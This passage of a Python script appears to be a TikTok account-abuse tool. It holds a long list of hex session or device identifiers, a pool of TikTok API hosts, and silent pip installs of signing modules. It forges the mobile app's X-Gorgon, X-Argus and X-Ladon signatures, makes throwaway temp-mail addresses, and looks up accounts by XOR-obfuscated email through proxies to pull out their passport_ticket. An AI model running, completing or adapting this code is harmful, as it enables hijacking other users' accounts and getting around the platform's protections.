'9e42fb4166611ce207b8bfcf8e76193d', 'f8448f180e37a6157b2fa6728929c858', '300d027cc70fd71efa2dc4e1661bd053', '28e5067ca59aefefe8a5716a4c257019', '3a3ad8e66b4a328280aeb8def7e4526c', '7a35f4c1fe2909ee619f881438757502', 'cfd0cea0924da90ef2d7e413f4d1b618', '3c639274b33f920b4e2509382a26e737', '62ce3b7afc11cc60503d57c50d46eb4a', '5fdd7957547d882ca1e3c5b3d33420e1', '13de4a9b03153f3d415746951871cab1', '114f488327fe3f9e0cb7e5d0c93e18da', '759fca154d2a4e1f801842e3a79f6766', '0b6ad9305fbea569f7c5d4b9d17cbdc9', 'd176247e0d0e5991755527960c9bac6e', 'f1b2fee1dd90c445fd9c91de64b3bdbb', '7b7230e76e67e6d467aa6c6e33694b23', 'd7f340e143dbb4eab73dd8f675d20b97', '7013e9767ad43770d1a86cdd45b880e5', '4505ccb48f0a6a2541e34caaefac8840', 'e56d4e0c3f4034f9d6aada115759169c', 'c33a0ef15486debe17f4a38fc4bcb1b0', 'cc961ebfa09ba689786484f07b9b932c', 'f80b8abf5291f2d958ca9bbc8285eb8a', 'e370e7e1b0a0010360282d131c2d0613', '63ab5a670d8d6a9fbd14f7d3fd0b30da', 'f699c60e0671ac8cf07b47b98876e750', '8c77d0106c0249ad50fdccdcea3ab888', '7c67d00d73751c447972067da77b9c08', 'ba0cb1b483e91b176e0a9e8991d24d29', 'bc4d7382e95f3b9fa79d9164dac426e6', '2675c0445217ed43acaa90e9835d3801', '6f968388b83d7ff2e19659c527b1ad08'            '196d5ea17130e0ff10ef183f7e150238',
	'69f53e6cfce263d3399991fe2a8e0739',
	'66087b455831238f20ef015b1edd0b85',
	'20bb70557f527eb5ebb903730c8adfdc',
	'43a171f4ed796ae7aee0f2681e5d4771',
	'a21b2d5219c96bcb7a00cd850fc3857b',
	'551a45b941e5c50e8e3e07ce86acaee9',
	'8b2dba967f78f37c3ab6a70ee71d6e56',
	'2a4b553e75abf821c9276b8871808fc7',
	'7b6e5208a1ad343141a17427e2aae408',
	'1eb5090b6533e3f0476074fe544574b9',
	'08f3374473dea81553b8368219673245',
	'bcfe2f9fe7e50667c06a47a8f01de146',
	'22ec5069e0378b0a07c5735924075a47',
	'806a4f317a0a9642a155d81d4311f226',
	'2723b41bfbc3366e3fbbd428fbe2dcd9',
	'0585c6c199fa0dc0dd0259b571226855',
	'6a7f1ec7cc06cc0e4cdb8e222115808a',
	'5ee5d7b8db9ea6adc488a6d8922f41db',
	'5a7e7c83f61e6e0e1c3ca128cd3ee79a',
	'401c36fc2d0abbdda740a52838cd31c2',
	'a3b91f7d92a916ce843690a99f0c43ee',
	'c46f26a1aa31f443e6b73a2baab4fcb4',
	'e64ed96b8c3ea51c4524b7dd25bf0abd',
	'0f92ff1418ccd9d3d9bfdf27d3a2a3b6',
	'0f92ff1418ccd9d3d9bfdf27d3a2a3b6',
	'31fffc2561f90d7780c034db4f458dad',
	'e64ed96b8c3ea51c4524b7dd25bf0abd',
	'f2a3ec8f71217f2fa2ed8507a8641920',
	'6fa98a5d216b91fb49e8bd0f50b6dc29',
	'3a19ad6aec83c77bf58ad20a95d87b02',
	'ffea1b72a3de8ebb5c1e48c91d3886cc',
	'c0ed975d7fab0b17ea77c9aac4772eda',
	'62f665d8fef41027c569a264e39d1884',
	'8799b7c86a83c99eb082e963e930b426',
	'30ad5eb572241440c7f642ad07c3972e',
	'3e815d7ed8d5ee5ed26394221cb94814',
	'b521fc106d86884df7392b0d47094b42',
	'70e134536c70bbd31b540bfb9abd9f16',
	'a79666d0aedf81af7dec5e7302ce1a6a',
	'b18a44f1169bfdcd307474ceada8090c',
	'46b49a9a910464297d4a2d703cfffb60',
	'9b465c4456506e57cbe2f673fe3d748f',
	'333c2f1fa9ccc31d05e3433f33379f23',
	'1e5aa603077be314c594aa05c85a29c7',
	'226d6f0f02dd07ea3e0e3c7e1a54ee98',
	'f60c544b5014358574cd7df1c1751f42',
	'b054149c7a2fa4681298030e91d0c033',
	'fb32c6bfd5bdef0cd0b9e5c999cf9e46',
	'11fbbcffb0525d52bc394389f24a936b',
	'30514372833cc1b571f8dc8a0f55db94',
	'88c024610ed4bf8ceb37cc92e78b4438',
	'fc1f9672a6d4177993114198414be131',
	'd8f6f9558e1807a1cd083f13de997693',
	'fef15837eef02f1ebd56523240dd5be0',
	'5e4e1267e08331d25ed7012d84f78243',
	'32df03aa0a45104c29c0eb241bfaf052',
	'277641c2bd68423af3c97ee64116c9ea',
	'608e50f670227682805b6c4db9008025',
	'f6c32b0881229967ea0e5c90635fa19e',
	'8f68c10b8a60b64e8d2dd3fcb1cdc6be',
	'497a97f73536f4f24831bebfed672258',
	'6f7a25ed7db6c0620d7d4b1a1779813d',
	'df9f5cef1f2d05757af659235150e5a6',
	'ab47913dc08abeb336556e9418449995',
	'c3b41475865dd21e2a42be682cbbeec7',
	'be5d43022279aae0fbb2810645e3a655',
	'e1f1b7e764da963f9d0dfbc2f8c811fb',
	'd0900ba89c1a62c7334db51b90d08046',
	'5eccb0f11bda1f3744d306f7a1c2e4ee',
	'871319a3e34f2034d5204f3e9d3fc9bc',
	'800266a1b9550a662a533bbe0a51edff',
	'ac8cdd63d992feda7eb1be63cd5d3cbe',
	'fe087743cb83b87fe511c4dcc2b54b9e',
	'28797e6bb6e3b4a2924bdd17d5ac2c9d',
	'ecbce30174a3109533e8c9db2b400e9f',
	'de296140fdf052974d313dffaeac39a8',
	'def6f7881ea24c7c6e2f2faafd749e33',
	'5cd2eb39aadf7c11bc741131fefe8352',
	'e2b90094da6ff546902b52c7cbcea7bb',
	'b9d8b79367847fd9dfb8647bb96edd41',
	'38df69157cd19f89825ad86e40533b3e',
	'eb3fa50f60dd60f3a415f4d57d5c368d',
	'8a9e4778c7074dc6497bce8fbc3e7be6',
	'f99638331ea251eba1dfae6ad3e331cd',
	'1d5a8ad70fe1273483834fd99ba1cdee',
	'531e7ed1aa699a929b313b8960677c07',
	'36726a0145f85571c4d7919a564a330d',
	'3e99fe2e40577af27dc4fb15f9b438f7',
	'80b98f6c3b0e9eb1737f0fb96cb73e1d',
	'99b2c615978200c679b321f04d314d49',
	'6452b4925edad1b34284d9cf4887d281',
	'475880946e2be5c2539a6c51746d2a27',
	'12700e53ced122977a6705435f8dc433',
	'99199284fc83817a51844b35e12b9a18',
	'41dede88fec05de213462698b04ce27f',
	'2c973cfb6559bc0369cefdbb75d5cbb7',
	'98b6f608bcb1a1714f7d14ec97397dad',
	'c33e3da3ec3b8e611625db85fb8ea360',
	'dc7d2164919b5432676b4a8315d8f8b3',
	'1edfd0dbb4f14549ead50fb19dc0dae3',
	'771fc5bce51efef06174c5aa78fa896c',
	'f2da58a0f3b534620e8ca7d070be1457',
	'e0a008174fbb2f2c1923e7ca2d7ae0ba',
	'160ca3c436693fcdc1165149c04d26c6',
	'6b73e7069c58abfa77d72af913c75601',
	'fb3ecd7a225441bcdf0f82a153976c51',
	'959c67bd75dce25e3913ddbe7831013c',
	'01d9a4ee761a44ab1f80d4554cc10301',
	'98ac6a1ed1cea0cd7dd86da4ad548983',
	'9e42fb4166611ce207b8bfcf8e76193d',
	'f8448f180e37a6157b2fa6728929c858',
	'300d027cc70fd71efa2dc4e1661bd053',
	'28e5067ca59aefefe8a5716a4c257019',
	'3c639274b33f920b4e2509382a26e737',
	'114f488327fe3f9e0cb7e5d0c93e18da',
	'd176247e0d0e5991755527960c9bac6e',
	'f1b2fee1dd90c445fd9c91de64b3bdbb',
	'd7f340e143dbb4eab73dd8f675d20b97',
	'7013e9767ad43770d1a86cdd45b880e5',
	'e370e7e1b0a0010360282d131c2d0613',
	'63ab5a670d8d6a9fbd14f7d3fd0b30da',
	'bc4d7382e95f3b9fa79d9164dac426e6',
	'9b19bb4e743f4220cc05770ab88164af',
	'f7a3b3d4b075b192cffd1beb30b813c7',
	'a2b82c8d086aef0c1946dee0cc6214db',
	'5fcdc96a5809d66bbb060307894a643e',
	'959e8061d7001ae76ee67a2e9ea4f263',
	'6773c0dc625db993955490cbd695999d',
	'4230e681404606e3f835eb5dc2ad21de',
	'834cdf818b735bcb62050f3d4e4ca6cf',
	'8c3e52f39908c59ef4e9b2ca1b7878c4',
	'8611ac5fe2a6c2aaba8b7a6e7928c10f',
	'd0210d3fc97f97f81b85a36c084f2e10',
	'6d48d9a4f32a8c616c90fea374b84f56',
	'aa9d4cb3400f9bef1fb81b1a0282c533',
	'4784774b438e41c63f6bbc79e3c49d0f',
	'c848604685819ec5fce059f143d94793',
	'8349d2cab77f8a74874f311afab0dc6b',
	'47d7ee7302eaf4ad67f773747ff486fd',
	'd7b6d4259088181eeccd580a9ec9e5cf',
	'f9fcbcab67b85aaa162a3be1d8376808',
	'0ae190135e514836ce46743aee147f83',
	'b84c01904844bfc45216d073852ef9b1',
	'fa2763a42b2003d21f4b0df59e09fd47',
	'99103121c3a0a19a5e64c47531727f9c',
	'071dea6260fa1e0d51f820eadae4accb',
	'7a9620194c456a1bb59248921098ee76',
	'25cc37b1ea370628f3e7a5ec751dbc37',
	'd37a92233da70de1d7734a9784496e1d',
	'5d4fec8d23a50b3b24958a9ed15d65f5',
	'09a16299b435e99b11a2844485d8cb44',
	'ff505efd41031f28a3da8de6718f2df3',
	'd1561efba0f0b7c42584c0a712ba9e08',
	'109d7c51cd047a8a339faf554728b4bf',
	'28e163347921640fda0aa48c3a3e26e6',
	'12a6ab211938a71fd78d1b3db8e5a153',
	'255bbb0d976c03671ce8108cfe11b896',
	'c22f32589db330c04e22d94794f423d7',
	'388f27cc21e32dcfe748cd26493c9002',
	'9e38d02f94634bbed9921bc094b86e47',
	'eb06afe6066ea3daeef99636e47f97b9',
	'c187abedab2202554f6f39f17d71e643',
	'e4cb96fff89c84615b6ca65eece7b67d',
	'6a64089fa0e166877f8633f7910a6341',
	'96dca9e4c68c5ece6c2910763fc39007',
	'2a8e162c4f0626e8bd2a7dc1483b27c3',
	'e14c6616279c82b7d603d67b1b2bd0cf',
	'48a1d0adf988fb326d4f1ce055c035d1',
	'cf8f84b31ddb5f2606331fc75b6d10b5',
	'b031795f45495345b7ed3bcee2be2e05',
	'6e6ebdef9d110ea8468066a99fb35431',
	'a632f2d750d448cee6638143077e4616',
	'05398d4cab356ef576ac59d31e024c5b',
	'd62a23f3121daaea933ab827e6a7296d',
	'ee266ccac29b40c71a725b47f907bdfa',
	'4d33e970315daccdfa98b0bcd289a148',
	'4de29081b58fa894e2d9dae77cc8c007',
	'05c9711180d7c27eca7c0350d3a21724',
	'fa9ccab8a9febe630c9507dd798cf2c4',
	'c305ff6eff7d6539d239fa930336f249',
	'6949c01623b5e1b80c34e8f8b69427e2',
	'03658898aa705236a6196c3a45a1a08c',
	'a7a3e019f5acb50780d666c77da882bd',
	'acd45982ed97a57232c039cdbd0361a0',
	'510341fb6c3b5b93403b170f6fcfcf71',
	'7ddfd72ec2f19222cf1d39d936e37464',
	'8b2ac569d5067237105dc2d3a9c882dd',
	'a05c9cbadfc557f88c84231e91811473',
	'e26f693a49e67140f8130cf8aaf43ac8',
	'4b41f36dec3ec80b06e867cc4d510da4',
	'e08a945fe0f95eac0825e672e5da6399',
	'aaf4396b09b2a4ae6e94e87ea355d55e',
	'62c00fd6a6ebcfa01d34c5c7e9d76fee',
	'2b944b383cbca03aaac4ffc480e607e3',
	'32165cabd98d4961d2f4b4a3956da32e',
	'21d395931e48f9e77ddd29b30e12dabe',
	'b18863134f8644b046da0ef596c95948',
	'3ef3e2f6770c58b0a33999646ac5da09',
	'4df9ab652a37448b8f1d0c260a8b36c1',
	'02a749bbec10504f4458d7408af358be',
	'9e216d83dc21148e2908873c11e8dfe5',
	'2d89305cb842264795438a7becae7746',
	'ac9989d3dd0780057acbc431a4615aab',
	'2d64fbd41353134661267af9b543d603',
	'13cfd7515fd4f8e7c3fb1c2baee1d4e5',
	'9d5d2ce46011f31fd5bb44db0aadeec7',
	'2cd4f11db806bcfdbcc080287a6a24ce',
	'a0262d0d3c387d058425f772ef2aaddc',
	'd0d4651a4b9d7de6021f5aeb39c18cb3',
	'72f145dc8a75e265ee9e54ad48d03acf',
	'02940f5f24ce2b3dc2979385fc0a0e4f',
	'1747d761d4186b49720c4553bf8e429b',
	'fc91720d1e5722dea724f96cbe7be48b',
	'90f2f7e5b184e93538b7b07aee552a7a',
	'ce87e30cd6ecdd4946b6521dc6f7f28e',
	'7b71295b2b7ece941b563d9f5a13c5d9',
	'cd8bd19192cc165634eb9b625fa51197',
	'1750338f93bf15532b7875c2fc7e5edf',
	'26af96223c9534a1fbcb6ace2669ee03',
	'1c3d0dce7e09dc846b195436a6feca5c',
	'1883abaa2abb68dfaa5385ffd8fb1210',
	'd078ec8a3d4d76336f7f5ef102a93960',
	'b9a7d4a3fe37320114a8616374025c27',
	'3fd8fc9ecff1fd02eb2188917cf9305c',
	'c6e7f8edb527733c6c83ec353d8e39d7',
	'4a502defc0a2b58eb571146bbf9f9d88',
	'38c1662a5a6f7d61b36a28c2a64c3a5c',
	'e60f73fa0e6c40d7b7ff7e6cbf84d3a3',
	'dbcc9b8c283f410c6358bc23c24a5f3e'
	
'6d66c8148d4dc14d5fcf815f2adf9d66',
'686ed6ce7442dd7283421250a8560971',
'563706cba3430973e6775fa8e05d010f',
'4c914850c48c30932cdc890d90ad0aa9',
'8a0f805b4ffaed72f1d8baeb5011c862',
'e072272a7a837d71042fed185630d86e',
'fafeea423aab4765588cca408d734e80',
'120d65558900a8eab61f3ade4d1de1e2',
'28ade3a02b4f5bb113172cbf7d65e617',
'3ba2671e4af7171f04125f5977b39f34',
'5d002f329e451da117c0ab218941c66e',
'6e09e61e8356d472c39f60d8962b86f9',
'30fe4c88e1e66f7dd16653b9492ba36a',
'07b1dfefc4e33a5ef97dfd8cb0255763',
'1942d5a4ee45f83694211a3caffa45fa',
'1b4265e9979f18673b948f26081a438a',
'97c2f594685a1880c8da5ee6f1be4701',
'81e371d0984593f50a4dbd14a4aac49d',
'45290960247d4bcbdefa036387c6df91',
'8a94188e4942352e480b01dd43048bed',
'5b81a6159ed4113b432daf9e0c91e0fd',
'c39ddb69a50776760d5b25a3c2a055d4',
'a8361af54392d1dd5ea566f6514447cf',
'd26a51b3deaad301b9527610c5d9a42d',
'88edad4c57dc14c24fd1e82fd42d42d6',
'5b3b7538f89d2115ac2dc405c9a9bb31',
'7e0d4177ee71eb4a343288c8728f7b9a',
'bac58389187f91a03c93227a1c397644',
'ee6ac8d11d0b1276acf55216b44553b7',
'6c034901c740cb3eac51c943413d8856',
'7bf2de22f991060a6141fdc4e896dc2b',
'2a2cdc1f66a0498f79ac00ae35ab8c79',
'4f5f81bc2848959420b073338ed54d56',
'6011989b80ef65d90533fe6aeedc253d',
'c5b4c473169b9c0b2408264f66169480',
'bb6b9933c604e2ad06994f5948b5e5e2',
'1bd5a14efd3cd6a932a99560fe33e722',
'5e4d9865cb984ef6158b874e1a716058',
'287427a2257b70959ca2eaddc2ed93d7',
'91879ed15c4897bee12933fbc85f7dbd',
'bfbc77e6b6080387483a8d65dc65b4d8',
'68fe5cb10014acb91b8b736040f15ecc',
'f85cde338cc29a9f422fd65597e881e3',
'e785f7619d34a01c5080d6aec845fb56',
'c3822f475d4e3595f597c7654fc13ddb',
'a02a87714453f84ee9cae66eb9eeccfa',
'fd5a5f1088fcef75ae69ca61d016e5d3',
'bc07039e102965fc3179c97ff21a8ab6',
'195e9b035b251c2d3634aa928dd9843e',
'7d171ca5d1f3ef7e66196931be68eba3',
'40bcd1acc1a0301ef3e271591d9457d2',
'74b0d1bed05b4be20e8843ffc19a48b3',
'14f26fa7763b7d5811f2666fe4da1209',
'7e003c92e691d84199b14839c1ef64b0',
'3e61ce7142962d916f4da9040b2fbd20',
'8dce1f1f0bd328bb846dfb377c90c365',
'ce434ca201e1ba3767873ccb70564fa4',
'7fab9165de8fc21a90c46d50d72d9401',
'525afdd4f29684e6fafbdeca93df035f',
'9590fa56fb2540b5f365b9a976458c01',
'def4d641a7f0e2e78b9beaa1b149e5dd',
'837a725616adf0f9c176f9dc305f3c35',
'7b09cdd1f2fdc2956999aad5e7cf1d5d',
'f831f78ac2663865dd43baacf52675f5',
'9c610b64e137cfa793a3eb1019c8818b',
'fe970bf6e7bd91a72bf6bbce7e4290e5',
'876d9b2a11b7ab20f34b180024221fbf',
'1a3a4614874a1f322fcda8d39db9a4ca',
'c71a530de36e468853a9f7c01c68e1fe',
'5fa47029583ebc2f02f3a8fa9cf43e6a',
'53df826d423e24616e720f4876bb5caa',
'b7bd5eb856ccc65324a703e18ead582c',
'68debc9a5ccb3c2a2cb14d2b85333716',
'2c02df28e1bbff0b3e9c29f96136d489',
'073fd26968357915689eb4849ecf3f3f',
'5989a6bc7008663ecb628891f6378614',
'270f9222eac7bc490823772ab6e2e5d6',
'9784c636cb613f5ffc9a2e088e6b52c9',
'da881e00f5ee6a8e8bdd8e204fba86c1',
'0450dfad42e8db67d641239eabbed617',
'41c1e8b111dfa0775e886ea1b109c034',
'9b6366a935b979859d735d6118b5569a',
'4948cab01813b7f45ce3ed83deb24610',
'4cbaea00da85706ed949a07ad0ff6319',
'182e7f44d791c249fcf5fe59fd986f1c',
'5d089b27d551ad19d34851edcca194d1',
'ccf708bcb2f4af8b61d01d41e11dda70',
'a16fa6c5be204caeef3e2db9abf7e54a',
'13172a5518fda52541c70ff0aafcbd27',
'e3bb7e67163a29bb0fc06e7e0785eb1d',
'de97ad66ce1497cf4d8b9d110dea93fb',
'72caa1c98fcb6f32f6e850bd4c35db82',
'5929a192c3372c966302a87ff6844b16',
'85243404172696b81af6e784d2d513d2',
'e7972403986ecaa1a0218b37b5e7f742',
'887d76695909dbe9feff5304f27f7351',
'32b74ddf8bd87ae98105f39614179819',
'330cef7f38c7c7b0547b08cbfad4fe0f',
'1cd5e5617199bd681f212563c62560cd',
'aa04acd6be5212dfb5359d917bc400bb',
'f6e082e9ad09055e18d964671d34418a',
'ded1defb1fcea071e414129961584569',
'3e95a8f74f9ab758c1da6133ac8e2e35',
'7cdf51082ffce2906b8691f96dd1a767',
'6778f0db1ed71ec9ca743590659e0a40',
'e9c9b92e3886039be3f3295c2209958e',
'0e1d791a3a9a7f97d735ba461616b3e2',
'673d8b3404eef8cbccd8597b89825342',
'0db62758493f7a0efb062044ac068dac',
'766be2c21fbe7ac435b0ce427ad8d411',
'ded062e4a4536dbbcb8aa82c860b2ec7',
'4f761f08a724692c9ecb5e7fc54cbea3',
'b6acb99c05b13b9ff866c26ee64a8fa8',
'fd61effb1d65a1b01c820361d8228c7c',
'd670e72823c751079017ca9a3b21020c',
'8d7571beb5a4285e6bccfa4cc6a4d502',
'3100e89c7b0d70e8a0f41233b28a769c',
'7001dc2643f83cf6e72def00fbccfc6f',
'5081bf0f8e54a1dd28629a50ae0b0e01',
'bfc82e343da85c35fe61dd8bff25fb77',
'46a8ef281a146aa734c5527148003fe5',
'df395f8ac47b3db8e9a8f899ac5937d3',
'd08e27df2c75af9276fc4b0f60d72d19',
'9ef5dd91a967ac5eb3deaa8e78adf7d4',
'780ec01c3c98a08b5af4bd334193142a',
'85cfcd1bcd5faac84efea1d806f74011',
'627f9797da21ddae8252afb2b6f31265',
'cd84eac5b77b47ea35832b713c56c052',
'fff60f27b77c81727fc51a6179efb9db',
'b9a1abec083377c00257c871ad364c1a',
'fe91a0a59dd0603e224b0b842894615c',
'0f79903bbb09b892cc79681bb0aca6a6',
'e457dac351c5f007b9a7576feafa14f0',
'10be1a172b9abb6d00176e99cb2e88e7',
'3fea0a59ae22f9576af3ae80a35229dc',
'65962c240045a234b26bb4eda36dcd04',
'cfa66361c270cd60c91525d8178b14b0',
'f9234f85851b66544e4d6db8be835ff5',
'b3c0884647b28c29c6b55ca22b615798',
'ee504e276daa005328e6c100cef59839',
'8f612ea133026f909d6a772b698635dc'

])
elif ses==2:
	nameee = input(f'	{a3}Enter {a4}Sesoinid : ')
else:
	exit(f'	{RED}Incorrect choice - اختيار غير صحيح')
		
os.system('cls' if os.name == 'nt' else 'clear')
hosts = [
    "api16-core-aion-useast5.us.tiktokv.com",
    "api16-core-apix-quic.tiktokv.com",
    "api16-core-apix.tiktokv.com",
    "api16-core-baseline.tiktokv.com",
    "api16-core-c-alisg.tiktokv.com",
    "api16-core-c-useast1a.tiktokv.com",
    "api16-core-quic.tiktokv.com",
    "api16-core-useast5.us.tiktokv.com",
    "api16-core-useast8.us.tiktokv.com",
    "api16-core-va.tiktokv.com",
    "api16-core-ycru.tiktokv.com",
    "api16-core-zr.tiktokv.com",
    "api16-core.tiktokv.com",
    "api16-core.ttapis.com",
    "api16-normal-aion-useast5.us.tiktokv.com",
    "api16-normal-apix-quic.tiktokv.com",
    "api16-normal-apix.tiktokv.com",
    "api16-normal-baseline.tiktokv.com",
    "api16-normal-c-alisg.tiktokv.com",
    "api16-normal-c-useast1a.tiktokv.com",
    "api16-normal-c-useast1a.musical.ly",
    "api16-normal-no1a.tiktokv.eu",
    "api16-normal-quic.tiktokv.com",
    "api16-normal-useast5.tiktokv.us",
    "api16-normal-useast5.us.tiktokv.com",
    "api16-normal-useast8.us.tiktokv.com",
    "api16-normal-va.tiktokv.com",
    "api16-normal-vpc2-useast5.us.tiktokv.com",
    "api16-normal-zr.tiktokv.com",
    "api16-normal.tiktokv.com",
    "api16-normal.ttapis.com",
    "api19-core-c-alisg.tiktokv.com",
    "api19-core-c-useast1a.tiktokv.com",
    "api19-core-useast5.us.tiktokv.com",
    "api19-core-va.tiktokv.com",
    "api19-core-zr.tiktokv.com",
    "api19-core.tiktokv.com",
    "api19-normal-c-alisg.tiktokv.com",
    "api19-normal-c-useast1a.musical.ly",
    "api19-normal-c-useast1a.tiktokv.com",
    "api19-normal-useast5.us.tiktokv.com",
    "api19-normal-va.tiktokv.com",
    "api19-normal-zr.tiktokv.com",
    "api19-normal.tiktokv.com",
    "api2-19-h2.musical.ly",
    "api2.musical.ly",
    "api21-core-c-alisg.tiktokv.com",
    "api21-core-va.tiktokv.com",
    "api21-core.tiktokv.com",
    "api21-h2-eagle.tiktokv.com",
    "api21-h2.tiktokv.com",
    "api21-normal.tiktokv.com",
    "api21-va.tiktokv.com",
    "api22-core-c-alisg.tiktokv.com",
    "api22-core-c-useast1a.tiktokv.com",
    "api22-core-va.tiktokv.com",
    "api22-core-zr.tiktokv.com",
    "api22-core.tiktokv.com",
    "api22-h2-eagle.tiktokv.com",
    "api22-normal-c-alisg.tiktokv.com",
    "api22-normal-c-useast1a.tiktokv.com",
    "api22-normal-va.tiktokv.com",
    "api22-normal-zr.tiktokv.com",
    "api22-normal.tiktokv.com",
    "api22-va.tiktokv.com",
    "api23-core.tiktokv.com",
    "api23-core-zr.tiktokv.com",
    "api23-normal.tiktokv.com",
    "api23-normal-zr.tiktokv.com",
    "api3-core.tiktokv.com",
    "api3-normal.tiktokv.com",
    "api31-core-alisg.tiktokv.com",
    "api31-core.tiktokv.com",
    "api31-core-zr.tiktokv.com",
    "api31-normal-alisg.tiktokv.com",
    "api31-normal-cost-alisg-mys.tiktokv.com",
    "api31-normal-cost-alisg-sg.tiktokv.com",
    "api31-normal-cost-mys.tiktokv.com",
    "api31-normal-cost-sg.tiktokv.com",
    "api31-normal.tiktokv.com",
    "api31-normal-useast2a.tiktokv.com",
    "api31-normal-zr.tiktokv.com",
    "api32-core-alisg.tiktokv.com",
    "api32-core-useast1a.tiktokv.com",
    "api32-core.tiktokv.com",
    "api32-core-zr.tiktokv.com",
    "api32-normal-alisg.tiktokv.com",
    "api32-normal.tiktokv.com",
    "api32-normal-zr.tiktokv.com",
    "api33-core.tiktokv.com",
    "api33-normal.tiktokv.com",
    "api74-core.tiktokv.com",
    "api74-normal.tiktokv.com",
    "api9-core.tiktokv.com",
    "api9-normal.tiktokv.com"
]

def get_random_host():
    return random.choice(hosts)
try:
    import PKK
    import requests
    from MedoSigner import Argus,Gorgon,Ladon,md5,time
except ImportError:
    os.system('pip install PKK requests MedoSigner pycryptodome')
    os.system('clear')
    banner()
class Encryption:
	@staticmethod
	def sign(params, payload: str = None, sec_device_id: str = "", cookie: str or None = None, aid: int = 1233, license_id: int = 1611921764, sdk_version_str: str = "2.3.1.i18n", sdk_version: int =2, platform: int = 19, unix: int = None):
		x_ss_stub = md5(payload.encode('utf-8')).hexdigest() if payload != None else None
		data=payload
		if not unix: unix = int(time.time())
		return Gorgon(params, unix, payload, cookie).get_value() | { "x-ladon"   : Ladon.encrypt(unix, license_id, aid),"x-argus"   : Argus.get_sign(params, x_ss_stub, unix,platform        = platform,aid             = aid,license_id      = license_id,sec_device_id   = sec_device_id,sdk_version     = sdk_version_str, sdk_version_int = sdk_version)}           
          
class SAN:
	@staticmethod
	def email_2_user(email):
		import datetime
		import sys
		import requests
		import SignerPy
		import secrets
		import json
		import uuid
		import binascii
		import os
		import time
		import random
		def xor(string):
			return "".join([hex(ord(c) ^ 5)[2:] for c in string])
		secret = secrets.token_hex(16)
		
		es=email
		xor_email=xor(es)
		params = {
		    "request_tag_from": "h5",
		    "fixed_mix_mode": "1",
		    "mix_mode": "1",
		    "account_param": xor_email,
		    "scene": "1",
		    "device_platform": "android",
		    "os": "android",
		    "ssmix": "a",
		    "type": "3736",
		    "_rticket": str(round(random.uniform(1.2, 1.6) * 100000000) * -1) + "4632",
		    "cdid": str(uuid.uuid4()),
		    "channel": "googleplay",
		    "aid": "1233",
		    "app_name": "musical_ly",
		    "version_code": "370805",
		    "version_name": "37.8.5",
		    "manifest_version_code": "2023708050",
		    "update_version_code": "2023708050",
		    "ab_version": "37.8.5",
		    "resolution": "1600*900",
		    "dpi": "240",
		    "device_type": "SM-G998B",
		    "device_brand": "samsung",
		    "language": "en",
		    "os_api": "28",
		    "os_version": "9",
		    "ac": "wifi",
		    "is_pad": "0",
		    "current_region": "TW",
		    "app_type": "normal",
		    "sys_region": "US",
		    "last_install_time": "1754073240",
		    "mcc_mnc": "46692",
		    "timezone_name": "Asia/Baghdad",
		    "carrier_region_v2": "466",
		    "residence": "TW",
		    "app_language": "en",
		    "carrier_region": "TW",
		    "timezone_offset": "10800",
		    "host_abi": "arm64-v8a",
		    "locale": "en-GB",
		    "ac2": "wifi",
		    "uoo": "1",
		    "op_region": "TW",
		    "build_number": "37.8.5",
		    "region": "GB",
		    "ts":str(round(random.uniform(1.2, 1.6) * 100000000) * -1),
		    "iid": str(random.randint(1, 10**19)),
		    "device_id": str(random.randint(1, 10**19)),
		    "openudid": str(binascii.hexlify(os.urandom(8)).decode()),
		    "support_webview": "1",
		    "okhttp_version": "4.2.210.6-tiktok",
		    "use_store_region_cookie": "1",
		    "app_version":"37.8.5"}
		cookies = {
		    "passport_csrf_token": secret,
		    "passport_csrf_token_default": secret,
		    "install_id": params["iid"],
		}		
		s=requests.session()
		cookies = {
		    '_ga_3DVKZSPS3D': 'GS2.1.s1754435486$o1$g0$t1754435486$j60$l0$h0',
		    '_ga': 'GA1.1.504663773.1754435486',
		    '__gads': 'ID=0cfb694765742032:T=1754435487:RT=1754435487:S=ALNI_MbIZNqLgouoeIxOQ2-N-0-cjxxS1A',
		    '__gpi': 'UID=00001120bc366066:T=1754435487:RT=1754435487:S=ALNI_MaWgWYrKEmStGHPiLiBa1zlQOicuA',
		    '__eoi': 'ID=22d520639150e74a:T=1754435487:RT=1754435487:S=AA-AfjZKI_lD2VnwMipZE8ienmGW',
		    'FCNEC': '%5B%5B%22AKsRol8AtTXetHU2kYbWNbhPJd-c3l8flgQb4i54HStVK8CCEYhbcA3kEFqWYrBZaXKWuO9YYJN53FddyHbDf05q1qY12AeNafjxm2SPp7mhXZaop_3YiUwuo_WHJkehVcl5z4VyD7GHJ_D8nI2DfTX5RfrQWIHNMA%3D%3D%22%5D%5D',
		}		
		headers = {
		    'accept': '*/*',
		    'accept-language': 'en,ar;q=0.9,en-US;q=0.8',
		    'application-name': 'web',
		    'application-version': '4.0.0',
		    'content-type': 'application/json',
		    'origin': 'https://temp-mail.io',
		    'priority': 'u=1, i',
		    'referer': 'https://temp-mail.io/',
		    'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
		    'sec-ch-ua-mobile': '?0',
		    'sec-ch-ua-platform': '"Windows"',
		    'sec-fetch-dest': 'empty',
		    'sec-fetch-mode': 'cors',
		    'sec-fetch-site': 'same-site',
		    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
		    'x-cors-header': 'iaWg3pchvFx48fY',
		    
		}		
		json_data = {
		    'min_name_length': 10,
		    'max_name_length': 10,
		}		
		response = requests.post('https://api.internal.temp-mail.io/api/v3/email/new', cookies=cookies, headers=headers, json=json_data)
		name=response.json()["email"]
		host=get_random_host()
		url = f"https://{host}/passport/account_lookup/email/"				
		s.cookies.update(cookies)
		m=SignerPy.sign(params=params,cookie=cookies)		
		headers = {
		  'User-Agent': "com.zhiliaoapp.musically/2023708050 (Linux; U; Android 9; en_GB; SM-G998B; Build/SP1A.210812.016;tt-ok/3.12.13.16)",
		  'x-ss-stub':m['x-ss-stub'],
		  'x-tt-dm-status': "login=1;ct=1;rt=1",
		  'x-ss-req-ticket':m['x-ss-req-ticket'],
			
		  'x-ladon': m['x-ladon'],
		  'x-khronos': m['x-khronos'],
		  'x-argus': m['x-argus'],
		  'x-gorgon': m['x-gorgon'],
		  'content-type': "application/x-www-form-urlencoded",
		  'content-length': m['content-length'],
		
		}
		proxies = {"http": f"http://{proxy}","https": f"http://{proxy}"}	
		response = requests.post(url, headers=headers,params=params,cookies=cookies,proxies=proxies)		
		passport_ticket=response.json()["data"]["accounts"][0]["passport_ticket"]		
		name_xor=xor(name)
